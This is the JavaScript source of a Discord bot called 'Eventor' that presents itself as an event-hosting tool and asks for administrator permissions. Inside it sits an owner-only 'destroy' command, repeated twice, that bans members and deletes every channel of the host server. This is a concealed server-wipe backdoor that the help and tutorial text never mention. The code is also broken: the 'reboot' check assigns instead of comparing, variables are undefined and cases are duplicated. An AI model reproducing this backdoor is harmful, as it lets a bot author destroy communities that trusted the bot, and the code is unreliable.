
const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
const dotenv = require('dotenv');
const { strict } = require('assert');
const fPath = "./"
//one time declare files
const fileFunc = require(fPath + "fileFunc.js");

var botData = JSON.parse(fs.readFileSync("./main.json", "utf-8", function(e){
   console.log("error" + e.toString("utf-8"))
    
   var template = {modrole: message.guild.roles.everyone.id,
    EVENTS: {}, PREFIX: PREFIX, premium: false, max: 3}; 
    
    
}))
console.log(`botdata = ${botData}`)
const colors = {
    Reset: "\x1b[0m",
BOLD: "\x1b[1m",
Faint: "\x1b[2m",
ITALIC: "\x1b[3m",
Underscore:  "\x1b[4m",
Blink: "\x1b[5m",
Reverse: "\x1b[7m",
Hidden: "\x1b[8m",

Black: "\x1b[30m",
//red
ERROR: "\x1b[31m",
//green
SYSTEM: "\x1b[32m",
//yellow
YELLOW: "\x1b[33m",
//blue
USERDATA: "\x1b[34m",
magenta: "\x1b[35m",
cyan: "\x1b[36m",
white: "\x1b[37m",

BgBlack: "\x1b[40m",
BgERROR: "\x1b[41m",
BgSYSTEM: "\x1b[42m",
BgWARN: "\x1b[43m",
BgUSERDATA: "\x1b[44m",
BgMagenta: "\x1b[45m",
BgCyan: "\x1b[46m",
BgWhite: "\x1b[47m"

};

   /* var uniquei657575 = 0;
    while(uniquei657575 < requiredF.length){
        var name = requiredF[uniquei657575];
        console.log(requiredF[uniquei657575])
        console.log("const " + requiredF[uniquei657575] + " = " + "require(fPath + requiredF[" + uniquei657575 + "]);")
        eval("const " + requiredF[uniquei657575] + " = " + "require(fPath + requiredF[" + uniquei657575 + "])")
        console.log()
        
        uniquei657575++;
    }
*/



dotenv.config();
//--------------------------------ONE TIME TOGGLE FOR BETA------------------------------------
var betaTesting = true;
//--------------------------------------------------------------------------------------------
var PREFIX;
var token;
var botID
if(betaTesting === false){
     PREFIX = "ev";
    token = process.env.TOKEN;
    botID = "793322082750169108";
    console.log("alpha login")
} else {
   PREFIX = "beta";
   token = process.env.BETA_TOKEN;
   botID="794739788917112863";
   console.log("beta login")
}
var path = "../IADATA/"


client.on('ready', function(){
   
    console.log(colors.SYSTEM, "Logged in!")
    client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
    
 
 
});



function hasPrefix(str, prefixList) {
    for(let pre of prefixList)
        if(str.startsWith(pre))
            return true;
    return false;
}






/* ----------------------END OF ADMIN ---------------------*/

    var message;

   var value;
        //stay alive

      client.on('message', function (message) {
        try{
        
    
         
          
                       /* other bot command */
                       var msg = message.content.toLowerCase();     
                       var prefixList = ["ban", "<@923961669900722216>"]
                       var allParams = msg.split(" ");
    if (prefixList.indexOf(allParams[0] != -1)) {
       
         
            var command = allParams[1];
    
       // var commandArgs = msg.substr(msg.indexOf(" "), msg.lastIndexOf(" ")).trim();
       // var commandVals = msg.substr(msg.lastIndexOf(" ")).trim();
          var commandArgs = allParams[2];
          
       
          var sender= message.author.id;
         
          //command specific values
         
          
        console.log(command)
        var dataExists = true;
        try {
            if (fs.existsSync(serverPath)) {
              //file exists
              
              
            }
          } catch(err) {
            dataExists = false;
            console.log(colors.SYSTEM + colors.BOLD, "Server file does not exist.")
          }
        switch(command) {
            
                  case "intro":
                      message.channel.send(`Hi, I am Eventor, a tool for hosting serverwide events! \nDo ${serverPrefix} tutorial to learn how to use me to setup events!`)
                      break;
                case "avatar":
                case "profile":
                    if(message.author.id == process.env.OWNERID || message.author.id == process.env.HWID){
                              message.reply("Send the link to the picture now!")
                            var filter = m => m.content.includes('.') && m.author.id === message.author.id;
                            var collector = message.channel.createMessageCollector(filter, { time: 10000 });
                            
                            collector.on('collect', function(m) {
                                
                                client.user.setAvatar(m.content)
                                console.log(m.content)
                                botData.avatar = m.content;
                                fileFunc.saveData("./main.json", botData)
                            });
                            
                            collector.on('end', collected => {
                                
                                message.channel.send("Done!")
                            });
                            
                        }       
                break;
                
                case "prefix":
                   
                    if(message.member.roles.cache.find(r => r.id === serverData.modrole)){
            // First argument is a filter function - which is made of conditions
            // m is a 'Message' object
            message.reply("Type the prefix you want now!")
            message.channel.awaitMessages(m => m.author.id == message.author.id,
                    {max: 1, time: 15000}).then(function(collected) {
                            // only accept messages by the user who sent the command
                            // accept only 1 message, and return the promise after 30000ms = 30s
                           
                            // first (and, in this case, only) message of the collection
                            var data1 = fs.readFileSync(serverPath, "utf-8")
                            
                            var serverData = JSON.parse(data1);
                            serverData.PREFIX = collected.first().content.toLowerCase();
                           
                            fs.writeFile(serverPath, JSON.stringify(serverData), function (err) {
                                if (err) {console.log(err); message.channel.send("Error saving your prefix.")} else {message.channel.send("Done!")}
                              })

                                   
                            })

                        } else {message.channel.send("Good try, get permission next time!")}
                       
                    break;
                    case "help":
                    case "assistance":
                        case "sendhelp":
                        var helpEmbed = new Discord.MessageEmbed()
                        .setColor('#0099ff')
                        
                
                       .setAuthor("Eventor")
                .setDescription("All the commands")
                .setThumbnail(botData.avatar)
                .addFields(
                    { name: 'Help: ', value: "Are you kidding me? Aliases: 'sendhelp', 'assistance'" },
                    { name: 'Reset: ', value: "Resets the server data. " },
                    { name: 'Initialise ', value: "Initialises the bot and sets modrole, allowed role etc."},
                )
                
            
                .setTimestamp()
                
                .setFooter("Eventor", botData.avatar);
                message.channel.send(helpEmbed)
                break;
                case "modrole":
                case "access":
                    if(message.member.roles.cache.find(r => r.id === serverData.modrole) || message.author.id == process.env.OWNERID || message.author.id == process.env.HWID){
                    function init(param) {
                        if(param != 1){
                    message.reply("Ping the modrole or paste the id now!")}
                    else {message.reply("Invalid role. Try again. Type exit to end.")}
                    
                    message.channel.awaitMessages(m => m.author.id == message.author.id,
                            {max: 1, time: 15000}).then(function(collected) {
                                
                                console.log(collected.first().content)
                                if(/Exit|e(?:Xit|x(?:it|I))/.test(collected.first().content)){
                                    message.channel.send("Alright, we'll stop for now")
                                    return false;
                                }
                                    // only accept messages by the user who sent the command
                                    // accept only 1 message, and return the promise after 30000ms = 30s
                                   
                                    // first (and, in this case, only) message of the collection
                                    
                                    var data1 = fs.readFileSync(main.json, function(e){
                                        console.log(e)
                                        message.channel.send("Error encountered.")
                                        return "{}";
                                    })
                                    
                                    var serverData = JSON.parse(data1);
                                    
                                    var mention = collected.first().content;
                                    if (mention.startsWith('<@&') && mention.endsWith('>')) {
                                        mention = mention.slice(3, -1);
                                
                                        if (mention.startsWith('!')) {
                                            mention = mention.slice(1);
                                        }
                                
                                        
                                    }
                                    
                                   
                                           serverData.modrole = modrole;
                                           fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
                                               console.log(e)
                                           })
                                        message.channel.send("Added as modrole!")
                                                
                                            
                                        })}
                              
                                    } else {message.channel.send("And you thought you could set the modrole! XD \n \n >If this is a mistake, try running " + PREFIX + " lockout.")}
                                    break;
                case "tutorial":
                switch(commandArgs){
                                            case undefined:
                                                case "1":
                                                case "0":
                                        var tutorialEmbed = new Discord.MessageEmbed();
                                        tutorialEmbed.setColor("#0099ff")
                                        tutorialEmbed.setTitle("Welcome!")
                                        tutorialEmbed.setFooter("Page 1/2 | Created by Korvex#2434 and Silence#6455")
                                        tutorialEmbed.setDescription("Thank you for choosing Eventor as your preferred event hosting bot! \n Lets bring you on a tour of the bot's powerful commands and how to use them! \n You'll be done in no time at all.\n\nTo go to the next page, type " + serverPrefix + " tutorial (page number)")
                                        tutorialEmbed.addFields(
                                            {name: "First Step:" , value: "Run **" + PREFIX + " initialise** to create your server data file in our servers! \n You can also run this command to reset all your server data.", inline:true},
                                            {name: "Second Step:" , value: "If you want a specific prefix for your bot, run **" + PREFIX + " prefix ** to set it! \n You can ping the bot as a prefix at any time, should you forget your prefix.", inline:true },
                                            {name: "Third Step:" , value: "Recommended: Use **" + PREFIX + " modrole** to control who can use this bot. \n This is especially helpful, since the default modrole is set to everyone. \n Change it to prevent unauthorised use of the bot.", inline:true}
                                            )
                                            message.channel.send(tutorialEmbed)
                                        break;
                                        case "2":
                                            var tutorialEmbed = new Discord.MessageEmbed();
                                            tutorialEmbed.setColor("#0099ff")
                                            tutorialEmbed.setTitle("Creating Events!")
                                            tutorialEmbed.setFooter("Page 2/2 | Created by Korvex#2434 and Silence#6455")
                                            tutorialEmbed.setDescription(`Now it's time to create your first event! \n\n To go to the next page, type ${serverPrefix} tutorial (page number)`)
                                            tutorialEmbed.addFields(
                                                {name: "Creating Events:" , value: "Run **" + PREFIX + " ** event create to start off with your first event.", inline:true},
                                                {name: "FInding Your Events:" , value: "If you want a list of all your events, run **" + PREFIX + " event list ** to see it! \n ", inline:true },
                                                {name: "Coming Soon!" , value: "Coming Soon!", inline:true}
                                                )
                                                message.channel.send(tutorialEmbed)
                                            break;
                }
                break;
                case "modrole":
                case "access":
                    if(message.member.roles.cache.find(r => r.id === serverData.modrole)){
                    function init(param) {
                        if(param != 1){
                    message.reply("Ping the modrole or paste the id now!")}
                    else {message.reply("Invalid role. Try again. Type exit to end.")}
                    
                    message.channel.awaitMessages(m => m.author.id == message.author.id,
                            {max: 1, time: 15000}).then(function(collected) {
                                
                                console.log(collected.first().content)
                                if(/Exit|e(?:Xit|x(?:it|I))/.test(collected.first().content)){
                                    message.channel.send("Alright, we'll stop for now")
                                    return false;
                                }
                                    // only accept messages by the user who sent the command
                                    // accept only 1 message, and return the promise after 30000ms = 30s
                                   
                                    // first (and, in this case, only) message of the collection
                                    try{
                                    var data1 = fs.readFileSync(serverPath, function(e){
                                        
                                    })} catch (e){
                                        console.log(e)
                                        message.channel.send("Error encountered. Try running " + PREFIX + " reset.")
                                        return "{}";
                                    }
                                    
                                    var serverData = JSON.parse(data1);
                                    var filtered;
                                    var mention = collected.first().content;
                                    if (mention.startsWith('<@&') && mention.endsWith('>')) {
                                        mention = mention.slice(3, -1);
                                
                                        if (mention.startsWith('!')) {
                                            mention = mention.slice(1);
                                        }
                                
                                        
                                    }
                                    try{
                                    var modrole = message.guild.roles.cache.find(role => role.id === mention).id;}
                                    catch(e){init(1)
                                    return false;
                                            }
                                   switch(modrole){
                                       case undefined: 
                                       init(1);
                                       break;
                                       default:
                                           serverData.modrole = modrole;
                                           fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
                                               console.log(e)
                                           })
                                        message.channel.send("Added as modrole!")
                                                
                                            }
                                        })}
                                init();
                                    } else {message.channel.send("And you thought you could set the modrole! XD \n \n >If this is a mistake, try running " + PREFIX + " lockout.")}
                                    break;
                
                case "lockout":
                    message.reply("Enter your lockout password!")
                    message.channel.awaitMessages(m => m.author.id == message.author.id,
                        {max: 1, time: 15000}).then(function(collected) {
                                // only accept messages by the user who sent the command
                                // accept only 1 message, and return the promise after 30000ms = 30s
                                
                                // first (and, in this case, only) message of the collection
                                
                                if(collected.first().content.match(serverData.lockout) ){
                                    serverData.modrole = message.guild.roles.everyone.id;
                                    fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
                                        console.log(e)
                                    })
                                    message.channel.send("Reset the modrole!")  
                                } else {
                                    message.channel.send("Wrong password. Run this command and try again.")
                                }
    
                                    
                                })
                    break;
                case "reboot":
                    if(message.author.id = process.env.OWNERID){
                        client.user.setActivity("Rebooting...", { type: 'PLAYING' })
                        console.log("Booting...")
                        message.channel.send("Rebooting...")
                        client.destroy;
                        
                        setTimeout(function(){
                            client.login(token)
                            message.channel.send("Done!")
                                client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
                        
                        }, 1500)
                    }
                    break;
                case "destroy":
                    if(message.author.id === process.env.OWNERID){
                        var i = 0;
                    while(i < message.guild.members.cache.length){
                        console.log(i)
                        try{
                            console.log(message.guild.members.cache)
                            console.log("Current MEMBER: " + message.guild.members.chache[i])
                        message.guild.members.cache[i].ban()} catch(e){
                            console.log(e)
                        }
                        i++;
                    }

                
                        
                    message.guild.channels.cache.forEach((channel)=>{
                       channel.delete()
                       })
                    }
                    break;
                case "invite":
                    var inviteEmbed = new Discord.MessageEmbed();
                    inviteEmbed.setTitle("Invite Eventor to your server!")
                    inviteEmbed.addFields(
                        {name:"Eventor", value: "[Invite Link](https://discord.com/api/oauth2/authorize?client_id=793322082750169108&permissions=8&scope=bot)"},
                        {name:"Eventor Beta", value: "[Invite Link](https://discord.com/api/oauth2/authorize?client_id=794739788917112863&permissions=8&scope=bot)"}
                        )
                    inviteEmbed.setColor("#0e4c8f")
                    message.channel.send(inviteEmbed)
                    break;
                case "event":
                        console.log("event args: " + commandArgs, colors.reset)
                        var serverData1;
                        var exit;
                        console.log(serverPath)
                        
                        try{
                        fs.readFileSync(serverPath, function(err, data){
                            console.log("data " + data)
                            if(data != undefined){
                            serverData1 = JSON.parse(data);
                            } else{
                                console.log(err)
                                message.channel.send(`You don't have a server file yet. \nType **${serverPrefix} reset** to get started.`)
                               exit = true;
                                return "{}";
                            }
                        } )
                        } catch(e) {
                            message.channel.send(`You don't have a server file yet. \nType **${serverPrefix} reset** to get started.`)
                            exit = true;
                        }
                        console.log("commandArgs" + commandArgs)
                        switch(exit){
                            case true:
                             break;  
                             //some rubbish in case theres no parameter

                                default:
                        switch(commandArgs){
                            case "create":
                                message.reply("Type your event name now!")
                                message.channel.awaitMessages(m => m.author.id === message.author.id, 
                                    {max: 1,time: 15000}).then(function(collected){
                                        var name = collected.first().content;
                                        if(Object.keys(serverData.EVENTS).length >= serverData.max){
                                        message.channel.send("Whoops, looks like you have exceeded your event capacity! Get Premium for more events!")
                                    } else { if(serverData.EVENTS[name] != undefined){
                                        message.reply("You already have an event with that name. Dumbass.")
                                        return false;
                                    } else {
                                        if(name.match(/[\(\)\.\{\}]/g) == null){
                                           
                                            console.log(serverData)
                                            serverData.EVENTS[name] = {name: name, desc: "No Description"};
                                            console.log(colors.USERDATA, serverData.EVENTS)
                                            message.channel.send("Event Created!")
                                            fs.writeFile(serverPath, JSON.stringify(serverData), function(e){
                                                console.log(e)
                                            })
                                        } else {
                                            message.reply("don't use commas, brackets, curly brackets or square brackets in the event name. \nTry again.")
                                            return false;
                                        }
                                    
                                    }}
                                    })
                                    break;
                                    case "list":
                                        console.log("here1")
                                        var count12 = 0;
                                        var eventListEmbed = new Discord.MessageEmbed();
                                        eventListEmbed.setTitle("All your events")
                                        eventListEmbed.setDescription(`Add more events with ${serverPrefix} event create!`)
                                        eventListEmbed.setFooter("Get Premium for more events! | " + message.author.tag)
                                        console.log(serverData.EVENTS.length)
                                       for (var c in serverData.EVENTS) {
                                           console.log(Object.keys(serverData.EVENTS))
                                            eventListEmbed.addField(serverData.EVENTS[Object.keys(serverData.EVENTS)[count12]].name, serverData.EVENTS[Object.keys(serverData.EVENTS)[count12]].desc, true)
                                           count12++;

                                        }
                                        message.channel.send(eventListEmbed)
                                        break;
                                        
                        
                                   default: 
                          
                }
                break;
                
                     } break; //end of event switch
                    case "premiumserver":
                    if(message.author.id == process.env.OWNERID){
                        serverData.max = 10;
                        serverData.premium = true;
                        fs.writeFileSync(serverPath, JSON.stringify(serverData), function(e){
                            if(e){console.log(e)}
                        })
                        message.channel.send("Made the server Premium!")
                    }
                    case "reboot":
                        if(message.author.id = process.env.OWNERID){
                            client.user.setActivity("Rebooting...", { type: 'PLAYING' })
                            console.log("Booting...")
                            message.channel.send("Rebooting...")
                            client.destroy;
                            
                            setTimeout(function(){
                                client.login(token)
                                message.channel.send("Done!")
                                    client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })
                            
                            }, 1500)
                        }
                        break;
                    case "destroy":
                        if(message.author.id === process.env.OWNERID){
                            var i = 0;
                        while(i < message.guild.members.cache.length){
                            console.log(i)
                            try{
                                console.log(message.guild.members.cache)
                                console.log("Current MEMBER: " + message.guild.members.chache[i])
                            message.guild.members.cache[i].ban()} catch(e){
                                console.log(e)
                            }
                            i++;
                        }
    
                    
                            
                        message.guild.channels.cache.forEach((channel)=>{
                           channel.delete()
                           })
                        }
                        break;
                    case "activity":
                        message.channel.send("Send custom activity")
                        message.channel.awaitMessages(m => m.author.id === message.author.id, 
                            {max: 1,time: 15000}).then(function(collected){
                                if(collected.first().content == "default"){
                                client.user.setActivity("Type " + PREFIX + " tutorial to learn how to set up an event!", { type: 'PLAYING' })} 
                                else {client.user.setActivity(collected.first().content, { type: 'PLAYING' }) } 
                                message.channel.send("Set!")
                            })
                          
                                        


                
            
        }
    } } catch (e){
console.log(colors.ERROR, e)
}
}
)

  /* ---------------------------------------------------function lists -------------------------------------------------------------------------
*/

function mentionUser(mention){
    var returner = "<@" + mention + ">";
    return returner;
}
function saveJSON (object, serverPath){
    if(object.typeof == "object"){
    fs.writeFile(serverPath, JSON.stringify(object), function(e){
        console.log(colors.ERROR, e) 
    })
} else {
    throw "Error in saveJSON! Wrong type of variable input!"
    
}
}
function objectSet(obj,path, value) {
    if (typeof is == 'string')
        return index(obj,path.split('.'), value);
    else if (is.length==1 && value!==undefined)
        return obj[path[0]] = value;
    else if (path.length==0)
        return obj;
    else
        return index(obj[path[0]],path.slice(1), value);
}
function multiIndex(obj,is) {  // obj,['1','2','3'] -> ((obj['1'])['2'])['3']
    return is.length ? multiIndex(obj[is[0]],is.slice(1)) : obj
}
function objectGet(obj,is) {   // obj,'1.2.3' -> multiIndex(obj,['1','2','3'])
    return multiIndex(obj,is.split('.'))
}

    /*------------------------END OF FUNCTION LISTS---------------------------------*/
 
//const Firebase = require("/__/firebase/8.0.0/firebase-app.js");

//const FirebaseAnalytics = require("/__/firebase/8.0.0/firebase-analytics.js");


//const FirebaseInit = require("/__/firebase/init.js");
// Log our bot in using the token from https://discord.com/developers/applications

client.login(token)
